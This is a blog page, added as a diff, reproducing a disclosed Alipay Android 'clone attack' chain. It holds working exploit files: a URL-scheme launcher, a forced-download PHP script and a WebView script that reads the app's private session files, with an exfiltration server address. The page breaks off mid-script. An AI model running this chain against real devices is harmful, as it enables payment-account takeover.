@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#fff">
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#fff">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="探讨哲学人生" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="author: Dlive@天枢&amp;amp;MMSL Team 0x01 前言该漏洞由腾讯玄武实验室发现 这个应用克隆攻击方式是多个漏洞所组成的攻击链 本文以支付宝为例，分析并复现此次克隆攻击 ps. 看了无数遍漏洞公告和演示视频，一点一点完善对利用过程的猜想，终于复现成功… 支付宝旧版本下载： http://app.cnmo.com/android/105072/history.htmlhttps">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TUGOhost的笔记">
+<meta property="og:url" content="http://yoursite.com/2018/01/17/支付宝克隆攻击原理分析与复现/index.html">
+<meta property="og:site_name" content="TUGOhost的笔记">
+<meta property="og:description" content="author: Dlive@天枢&amp;amp;MMSL Team 0x01 前言该漏洞由腾讯玄武实验室发现 这个应用克隆攻击方式是多个漏洞所组成的攻击链 本文以支付宝为例，分析并复现此次克隆攻击 ps. 看了无数遍漏洞公告和演示视频，一点一点完善对利用过程的猜想，终于复现成功… 支付宝旧版本下载： http://app.cnmo.com/android/105072/history.htmlhttps">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220546-58e823f0-fac6-1.png">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220615-6a67248c-fac6-1.png">
+<meta property="og:updated_time" content="2018-01-17T02:44:10.313Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TUGOhost的笔记">
+<meta name="twitter:description" content="author: Dlive@天枢&amp;amp;MMSL Team 0x01 前言该漏洞由腾讯玄武实验室发现 这个应用克隆攻击方式是多个漏洞所组成的攻击链 本文以支付宝为例，分析并复现此次克隆攻击 ps. 看了无数遍漏洞公告和演示视频，一点一点完善对利用过程的猜想，终于复现成功… 支付宝旧版本下载： http://app.cnmo.com/android/105072/history.htmlhttps">
+<meta name="twitter:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220546-58e823f0-fac6-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"perspectiveLeftIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"perspectiveLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'ERWS7U1MYB',
+      apiKey: '',
+      indexName: 'test',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/17/支付宝克隆攻击原理分析与复现/"/>
+
+
+
+
+
+  <title> | TUGOhost的笔记</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e92a9f9ada1fcbdd4cefa2184bc789ee";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TUGOhost的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">web狗的奇遇记</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-futbol-o"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-图片">
+          <a href="/images/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-image"></i> <br />
+            
+            图片
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/17/支付宝克隆攻击原理分析与复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="T.G.">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://qlogo1.store.qq.com/qzone/1192901808/1192901808/100?1514520393">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TUGOhost的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-17T10:44:35+08:00">
+                2018-01-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-01-17T10:44:10+08:00">
+                2018-01-17
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/01/17/支付宝克隆攻击原理分析与复现/" class="leancloud_visitors" data-flag-title="">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,601
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>author: Dlive@天枢&amp;MMSL Team</p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>该漏洞由腾讯玄武实验室发现</p>
+<p>这个应用克隆攻击方式是多个漏洞所组成的攻击链</p>
+<p>本文以支付宝为例，分析并复现此次克隆攻击</p>
+<p>ps. 看了无数遍漏洞公告和演示视频，一点一点完善对利用过程的猜想，终于复现成功…</p>
+<p>支付宝旧版本下载：</p>
+<p><a href="http://app.cnmo.com/android/105072/history.html" target="_blank" rel="noopener">http://app.cnmo.com/android/105072/history.html</a><br><a href="https://www.hackhome.com/zt/zfbjbbdq/xiazai/" target="_blank" rel="noopener">https://www.hackhome.com/zt/zfbjbbdq/xiazai/</a></p>
+<p>测试环境:</p>
+<p>支付宝10.0.12</p>
+<p>攻击者：Nexus 5  + Macbook pro</p>
+<p>被攻击者：Nexus 6p + Chrome</p>
+<p><strong>注意</strong>：<br>复现漏洞时请删除被攻击者支付宝应用目录下的热补丁<br>即删掉/data/data/com.eg.android.AlipayGphone/目录下files/apatch/和files/hotpatch/中的文件<br>这个问题坑了我好久。。。</p>
+<h2 id="0x01-攻击阶段1-URL-Scheme攻击"><a href="#0x01-攻击阶段1-URL-Scheme攻击" class="headerlink" title="0x01 攻击阶段1 - URL Scheme攻击"></a>0x01 攻击阶段1 - URL Scheme攻击</h2><p>通过将自定义URI方案设置src为如下所示，可以通过在页面中嵌入iframe来实现打开应用程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;paulsawesomeapp://page1&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这适用于Android版Chrome浏览器，版本18及更早版本。<br>适用于Android的Chrome版本25及更高版本的功能略有改变。通过设置iframe的src属性不再可能启动Android应用程序。<br>但是使用a标签是可以的</p>
+<p><a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220546-58e823f0-fac6-1.png" target="_blank" rel="noopener"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220546-58e823f0-fac6-1.png" alt="img"></a></p>
+<p>并且可以使用a标签+js模拟点击实现自动化打开app的效果</p>
+<p>以支付宝为例，反编译apk之后在manifest文件中发现支付宝支持的几个scheme</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;data android:scheme=&quot;alipayss&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;alipays&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;alipayqr&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;alipayauth&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;alipayre&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;https&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;alipaylite&quot; /&gt;</span><br><span class="line">&lt;data android:scheme=&quot;alipay&quot; android:host=&quot;merchantpay&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>问了一下身边专门做安卓开发的同学说应该不存在java代码里动态设置scheme的方法，所以目标就锁定在了以上几个scheme</p>
+<p>于是去查了一下上面几个scheme的相关资料，发现使用如下几个URL Scheme是可以在支付宝中打开Webview的</p>
+<p>我也尝试逆向了一下，但是后来发现在网上搜索相关资料就可以找到这个几个scheme的使用方法</p>
+<p>ps. 不知道为什么蚂蚁金服的文档中搜不到 <a href="https://open.alipay.com/search/searchDetail.htm?keyword=alipayqr" target="_blank" rel="noopener">https://open.alipay.com/search/searchDetail.htm?keyword=alipayqr</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alipayqr://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=https%3A%2F%2Fqr.alipay.com%2Faescsnt49njcwynkda%3F_s%3Dweb-other</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alipays://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=https%253A%252F%252Fqr.alipay.com%252Fbax041244dd0qf8n6ras805b%253F_s%253Dweb-othe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alipays://platformapi/startapp?appId=20000067&amp;url=http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>一开始一直以为这个漏洞是利用了安卓Webview的漏洞首先从http域跨到了file域，然后在file域中进行进一步利用</p>
+<p>但是这和腾讯关于漏洞的描述有些冲突，因为说是可以在没有漏洞的安卓系统上进行攻击</p>
+<p>于是仔细观察了腾讯的漏洞演示视频，受害者打开链接后有下载文件的过程，这时候才恍然大悟</p>
+<p>对Webview的攻击是直接加载的下载到受害者机器上的本地文件，也就是说文件被加载时就已经处于file域中</p>
+<p>后来经过测试之后前两个URL Scheme无法加载file域资源</p>
+<p>于是构造第一阶段攻击Exp如下:</p>
+<p>exp.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=&quot;display:none&quot; src=&quot;exp.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  $(function()&#123;</span><br><span class="line">    function clicksp()&#123;</span><br><span class="line">      $(&quot;#sp&quot;).trigger(&quot;click&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(clicksp, 500);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;alipayqr://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=file:///sdcard/Download/exp2.html&quot;&gt;&lt;span id=&quot;sp&quot;&gt;&lt;/span&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>exp.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-Disposition: attachment; filename=exp2.html&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Hello Alipay!&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
+<p>攻击阶段1达到了从网页打开支付宝app，并且下载和加载exp2.html的目的</p>
+<h2 id="0x02-攻击阶段2-Webview跨域攻击"><a href="#0x02-攻击阶段2-Webview跨域攻击" class="headerlink" title="0x02 攻击阶段2 - Webview跨域攻击"></a>0x02 攻击阶段2 - Webview跨域攻击</h2><p>因为文件被加载时就已经处于file域中，所以下一步就是读取支付宝保存用户信息的文件，然后回传到攻击者服务器上</p>
+<p>通过file域访问file域的资源需要设置API setAllowFileAccessFromFileURLs为true<br>通过file域访问其他域，如http域的资源，需要设置API setAllowUniversalAccessFromFileURLs为true</p>
+<p>关于这两个API的描述可以参考《WEBVIEW跨源攻击分析》这里不再多讲</p>
+<p>现在已经可以直接构造读取支付宝本地文件并回传</p>
+<p>攻击阶段2的exp如下</p>
+<p>修改攻击阶段1的exp.php文件如下</p>
+<p>exp.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-Disposition: attachment; filename=exp2.html&quot;);</span><br><span class="line"></span><br><span class="line">echo file_get_contents(&apos;exp2.html&apos;);</span><br></pre></td></tr></table></figure>
+<p>exp2.html （以读取shared_prefs/welcome.xml为例）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;Hello Alipay!&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function createXHR()&#123;</span><br><span class="line">    if(typeof XMLHttpRequest != &apos;undefined&apos;)&#123;</span><br><span class="line">        return new XMLHttpRequest();</span><br><span class="line">    &#125;else if(typeof ActiveXObject != &apos;undefined&apos;)&#123;</span><br><span class="line">        if(typeof arguments.callee.activeXString != &apos;string&apos;)&#123;</span><br><span class="line">            var versions = [&apos;MSXML2.XMLHttp.6.0&apos;,&apos;MSXML2.XMLHttp.3.0&apos;,&apos;MSXML2.XMLHttp&apos;];</span><br><span class="line">            for(var i=0;i&lt;versions.length;i++)&#123;</span><br><span class="line">                try&#123;</span><br><span class="line">                    var xhr = new ActiveXObject(versions[i]);</span><br><span class="line">                    arguments.callee.activeXString = versions[i];</span><br><span class="line">                    return xhr;</span><br><span class="line">                &#125;catch(ex)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return new ActiveXObject(arguments.callee.activeXString);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        throw new Error(&apos;No XHR Object available&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// send GET Request</span><br><span class="line">function sendGetRequest(url,callback)&#123;</span><br><span class="line">    var xhr  = createXHR();</span><br><span class="line">    xhr.open(&apos;GET&apos;,url,false);</span><br><span class="line">    xhr.send();</span><br><span class="line">    callback(xhr.responseText);</span><br><span class="line">&#125;</span><br><span class="line">sendGetRequest(&apos;file:///data/data/com.eg.android.AlipayGphone/shared_prefs/welcome.xml&apos;, function(response)&#123;</span><br><span class="line">    alert(response);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>效果如下</p>
+<p><a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220615-6a67248c-fac6-1.png" target="_blank" rel="noopener"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180116220615-6a67248c-fac6-1.png" alt="img"></a></p>
+<p>攻击阶段2达到了读取支付宝app私有文件的目的</p>
+<h2 id="0x03-攻击阶段3-克隆攻击"><a href="#0x03-攻击阶段3-克隆攻击" class="headerlink" title="0x03 攻击阶段3 - 克隆攻击"></a>0x03 攻击阶段3 - 克隆攻击</h2><p>2012年黑哥就提到过克隆攻击的思路，可参考《Attack Your Android Apps By Webview》</p>
+<p>同一用户使用账号密码登录多个设备支付宝是会被要求进行安全验证的(如选出该账号的好友、短信验证)</p>
+<p>但是通过拷贝/data/data/com.eg.android.AlipayGphone下的文件到其他设备的方式，支付宝是不会有安全验证的</p>
+<p>猜测支付宝在第一次运行之后就不再判断设备指纹，所以可被克隆攻击。</p>
+<p>测试的时候通过删除文件(可以用类似二分法提高效率)的方法逐渐确定和用户登录状态相关的文件</p>
+<p>经过一段时间的测试，发现支付宝中与用户登录状态相关的文件有如下几个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">├── databases</span><br><span class="line">│   ├── alipayclient.db</span><br><span class="line">│   └── alipayclient.db-journal</span><br><span class="line">├── files</span><br><span class="line">│   └── SGMANAGER_DATA2</span><br><span class="line">└── shared_prefs</span><br><span class="line">    ├── alipay_tid_storage.xml</span><br><span class="line">    └── secuitySharedDataStore.xml</span><br></pre></td></tr></table></figure>
+<p>攻击阶段3确定了与支付宝登录状态相关的文件，并读取这些文件回传到攻击者服务器上，攻击者拿到文件后将文件拷贝到攻击机上即可控制被攻击者账户</p>
+<h2 id="0x04-完整的exp"><a href="#0x04-完整的exp" class="headerlink" title="0x04 完整的exp"></a>0x04 完整的exp</h2><p>结合第一阶段、第二阶段和第三阶段的攻击，最终可构造几个exp文件如下</p>
+<p>exp.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=&quot;display:none&quot; src=&quot;exp.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">  $(function()&#123;</span><br><span class="line">    function clicksp()&#123;</span><br><span class="line">      $(&quot;#sp&quot;).trigger(&quot;click&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(clicksp, 500);</span><br><span class="line">  &#125;);      </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;alipayqr://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=file:///sdcard/Download/exp2.html&quot;&gt;&lt;span id=&quot;sp&quot;&gt;&lt;/span&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>exp.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-Disposition: attachment; filename=exp2.html&quot;);</span><br><span class="line"></span><br><span class="line">echo file_get_contents(&apos;exp2.html&apos;);</span><br></pre></td></tr></table></figure>
+<p>exp2.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;Hello Alipay!&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var server = &quot;http://10.210.38.162:8888/recv.php&quot;;</span><br><span class="line"></span><br><span class="line">function createXHR()&#123;</span><br><span class="line">    if(typeof XMLHttpRequest != &apos;undefined&apos;)&#123;</span><br><span class="line">        return new XMLHttpRequest();</span><br><span class="line">    &#125;else if(typeof ActiveXObject != &apos;undefined&apos;)&#123;</span><br><span class="line">        if(typeof arguments.callee.activeXString != &apos;string&apos;)&#123;</span><br><span class="line">            var versions = [&apos;MSXML2.XMLHttp.6.0&apos;,&apos;MSXML2.XMLHttp.3.0&apos;,&apos;MSXML2.XMLHttp&apos;];</span><br><span class="line">            for(var i=0;i&lt;versions.length;i++)&#123;</span><br><span class="line">                try&#123;</span><br><span class="line">                    var xhr = new ActiveXObject(versions[i]);</span><br><span class="line">                    arguments.callee.activeXString = versions[i];</span><br><span class="line">                    return xhr;</span><br><span class="line">                &#125;catch(ex)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return new ActiveXObject(arguments.callee.activeXString);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        throw new Error(&apos;No XHR Object available&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 